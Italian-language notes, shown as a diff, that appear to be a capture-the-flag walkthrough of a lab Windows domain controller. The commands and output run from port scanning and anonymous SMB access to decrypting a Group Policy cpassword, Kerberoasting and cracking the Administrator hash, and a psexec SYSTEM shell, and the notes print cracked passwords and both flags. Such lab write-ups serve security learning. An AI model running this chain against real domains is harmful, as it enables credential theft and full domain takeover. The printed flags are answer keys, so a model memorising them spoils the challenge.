@@ -1,0 +1,213 @@
+10.10.10.100
+
+
+sudo masscan -p1-65535 --rate 1000 --open --banners -e tun0 10.10.10.100
+
+Discovered open port 9389/tcp on 10.10.10.100
+Discovered open port 49158/tcp on 10.10.10.100
+Discovered open port 636/tcp on 10.10.10.100
+Discovered open port 49157/tcp on 10.10.10.100
+Discovered open port 47001/tcp on 10.10.10.100
+Discovered open port 139/tcp on 10.10.10.100
+Discovered open port 49169/tcp on 10.10.10.100
+Discovered open port 135/tcp on 10.10.10.100
+Discovered open port 3268/tcp on 10.10.10.100
+Discovered open port 593/tcp on 10.10.10.100
+Discovered open port 3269/tcp on 10.10.10.100
+Discovered open port 53/tcp on 10.10.10.100
+Discovered open port 5722/tcp on 10.10.10.100
+Discovered open port 49153/tcp on 10.10.10.100
+Discovered open port 389/tcp on 10.10.10.100
+Discovered open port 49171/tcp on 10.10.10.100
+Discovered open port 49154/tcp on 10.10.10.100
+Discovered open port 49155/tcp on 10.10.10.100
+Discovered open port 88/tcp on 10.10.10.100
+Discovered open port 445/tcp on 10.10.10.100
+Discovered open port 49182/tcp on 10.10.10.100
+Discovered open port 464/tcp on 10.10.10.100
+Discovered open port 49152/tcp on 10.10.10.100
+
+
+nmap -sC -sV -p9389,49158,636,49157,47001,139,49169,135,3268,593,3269,53,5722,49153,389,49171,49154,49155,88,445,49182,464,49152 10.10.10.100
+
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-05 18:19:44Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+49171/tcp open  msrpc         Microsoft Windows RPC
+49182/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: 2m19s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2021-12-05T18:38:51
+|_  start_date: 2021-12-05T18:11:51
+
+parto dal dns, nulla di utile
+
+provo con ldap (porta 389):
+  ldapsearch -h 10.10.10.100 -x -s base namingcontexts
+
+  namingContexts: DC=active,DC=htb
+namingContexts: CN=Configuration,DC=active,DC=htb
+namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
+namingContexts: DC=DomainDnsZones,DC=active,DC=htb
+namingContexts: DC=ForestDnsZones,DC=active,DC=htb
+
+
+
+non riesco ad ottenere altre info utili con ldapsearch
+
+
+provo a collegarmi con smb:
+
+smbclient -L //10.10.10.100
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	Replication     Disk
+	SYSVOL          Disk      Logon server share
+	Users           Disk
+SMB1 disabled -- no workgroup available
+
+
+l'unico share a cui riesco ad accedere in maniera anonymous è replication:
+
+smbclient //10.10.10.100/Replication --no-pass
+
+posso anche usare smbmap per fare in maniera piu veloce alcune cose:
+
+smbmap -R Replication -H 10.10.10.100                 //lista tutti i files
+
+c'è il file Groups.xml che potrebbe essere utile
+
+
+smbmap -R replication -H 10.10.10.100 -A Groups.xml -q
+
+
+
+non me lo scarica non so perchè, comunque posso scaricarlo anche con smbclient andando nella dir e usando il comando get
+
+ora posso legegre il contenuto del file
+
+c'è l'untente SVG_TGS
+
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+questa è la sua password cryptata (dovrebbe essere con AES)
+c'è un tool che permette di decriptarla in maniera semplice: gpp-decrypt
+
+
+gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+GPPstillStandingStrong2k18
+
+
+ora che ho username e password posso per prima cosa controllare quali utenti ci sono sulla ad
+
+python3 GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs
+
+[*] Querying 10.10.10.100 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2018-07-18 21:06:40.351723  2021-01-21 17:07:03.723783
+Guest                                                 <never>              <never>
+krbtgt                                                2018-07-18 20:50:36.972031  <never>
+SVC_TGS                                               2018-07-18 22:14:38.402764  2018-07-21 16:01:30.320277
+
+
+provo ad accedere con psexec.py si impacket ma non funziona perchè non ho diritti di scrittura su nesssuno share, a questo punto
+avendo delle credenziali valide posso usare smbmap per ottenere ulteriori info:
+
+smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.10.10.100                                                                                               2 ⨯
+[+] IP: 10.10.10.100:445	Name: 10.10.10.100
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	Replication                                       	READ ONLY
+	SYSVOL                                            	READ ONLY	Logon server share
+	Users                                             	READ ONLY
+
+con il volume USERS è possibile prendere user.txt
+
+86d67d8ba232bb6a254aa4d10159e983
+
+ma non riesco ad ottenere una shell, avendo delle credenziali posso provare ad usare bloodhound senza sharphound:
+https://github.com/fox-it/BloodHound.py
+
+python3 bloodhound.py -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -ns 10.10.10.100 -c All
+
+mi ha prodotto vari file json che apro con bloodhound, vedo che administrator è kerberoastable quindi provo ad ottenrer il suo TGT
+
+con
+python3 GetUserSPNs.py -dc-ip 10.10.10.100 -request  active.htb/svc_tgs
+
+LastLogon                   Delegation
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2021-01-21 17:07:03.723783
+
+
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ff2dfb244410b9c2473bc87984cc23a6$bdabfe79be4fde2c13690971a1fd7655143bb84e5c740b16af7e72ac0f8b29376ea7f7a12410f45cdad12db51cf284ee237c5ffc891b8b4b9c130f0cf591348aac509071a980131613ede9d2f1af5edcb42ff0f23f913982f728e0dc428b0c25a0cd17fe2488f06b7073541d709005d476a86e0179a4a2f8fe83b69014c63f7f53e6b470817a67643e44eac7824e39d33f28ac94a0dcb5c5ecb3bd21930e0825473f70210c14f31e3b65d58780da243b74ea77a1f99f4152f065084b7d83902f8a561d781132e636b0a14e9989f89b36d2406b2f345b5e28e94df59bc5110cc62f6a4f34a32c9566d3a4c84bad39a8b154789f7fdc5d2e7c8411b293bdff271fc25a41f7391b8e898ec28aaa89e6508970ec5736ed9717d752ecc8107c9782a06e795f9e1f4ad6d88c1f70e7996cb75a057aabd9d789cc98f0e8667429993883792ca0d8dec83c7e82abd7153e07780e63e501da23545dc23f03430d1bc395f7ff87dca208b08c8f4ae93d574670071acfa44c2d8b8ed45ff89c715b18f8bf02720aa6f5987e2bc5e8db57c7278a40d727b833985b35067785b5ec425a552635a8a72a6fd023b4dbe9eb41061d236385617750a170aa1b75428b0d312c9f5d242e81a28f149e54941cbae22ecb3eca46e8954fb51c0d10231d2eda25343a1ff2eba288ea7ebc5100854c339e9d1f5104b5d3c8f3a76fe2abd7bba06dfadf88f3e58b22219bedad4935a617fcf86a01f7240b1fe37c6f9e3f812e66db09d9f5f8b2b2c56e19639f5cf19822d4c34de4b3ab2975bbdfaae3bf79c3c984fd1392df047e03865ee026ff2e1d7ed0d70757437e2454035823bd8cf3e209ed30b9658a4ee76978accb8b994c137ddd31899773fd21b5254c2b5e561ad6ec1f3f8ea682753ccc22b36174a8d483a04a558c9b7e7c2f9771936492226a04b3d7360ee172bc13258155bbeb28702dcc14a05ee07a78ef17092d3de615086ac135e6964c43dc564df84d55f7314578e3d1e27ad5eda22a805a609a252403365608d2404d25aa890a4e4a6b850ae0f4625010966b3743520f0f9a7b6d71c776af176a74861a817b5a6389aaf2750e461ec7437d60ec9b362a23bcf99829b08a08a477f7494aff7ebda35e3f7b4253a4975920c7e6f76e77b7f06b1edbdbf673ec5404b352c6721bb23128c516119c0c759376ccec60cc9adf4daf2e97c292416be6da448f6cf364138c7683a32ea610873edd6d3c5993c6b6b4cfe6696c1668
+
+
+
+hashcat -a 0 -m 13100 tgt_admin /usr/share/wordlists/rockyou.txt
+
+administrator:Ticketmaster1968
+
+ora posso provare ad accedere con psexec che con svc_tgs non mi faceva accedere:
+
+sudo python3 psexec.py administrator:Ticketmaster1968@10.10.10.100
+
+C:\Users\Administrator>
+C:\Users\Administrator\Desktop>whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2AF3-72E4
+
+ Directory of C:\Users\Administrator\Desktop
+
+21/01/2021  06:49 úú    <DIR>          .
+21/01/2021  06:49 úú    <DIR>          ..
+21/07/2018  05:06 úú                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  23.455.264.768 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+b5fc76d1d6b91d77b2fbf2d54d0f708b
